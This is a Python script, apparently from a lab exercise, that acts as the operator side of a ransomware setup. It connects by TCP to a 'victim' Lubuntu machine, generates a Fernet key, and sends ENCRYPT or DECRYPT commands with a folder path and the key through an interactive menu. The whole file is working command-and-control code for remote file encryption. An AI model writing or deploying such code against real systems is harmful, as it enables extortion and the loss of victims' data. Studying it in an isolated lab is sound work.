import socket
from cryptography.fernet import Fernet
import os

def main():
    # Prompt the user for the IP address of the victim machine (Lubuntu)
    target_ip = input("Enter Lubuntu IP: ")
    target_port = 8080
    
    # Key generation: This key is generated locally on the controller side
    key = Fernet.generate_key().decode()
    print(f"[*] Key generated for this session: {key}")

    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Attempt to connect to the victim node
        sock.connect((target_ip, target_port))
        print("[+] Connected to Lubuntu.")
        
        while True:
            # Interactive menu for the operator
            print("\n1. Encrypt Folder\n2. Decrypt Folder\n3. Exit")
            choice = input("Choice: ")

            if choice == "1":
                # Send ENCRYPT command with the target path and the generated key
                path = input("Enter folder path on Lubuntu: ")
                sock.send(f"ENCRYPT|{path}|{key}".encode())
                # Display server response
                print(sock.recv(1024).decode())

            elif choice == "2":
                # Send DECRYPT command to restore files
                path = input("Enter folder path on Lubuntu: ")
                sock.send(f"DECRYPT|{path}|{key}".encode())
                print(sock.recv(1024).decode())
                
                # Optional: Clear the local key to simulate session end
                key = ""
                print("[*] Key removed from Controller.")

            elif choice == "3":
                # Exit the loop and close connection
                break
    finally:
        sock.close()

if __name__ == "__main__":
    main()
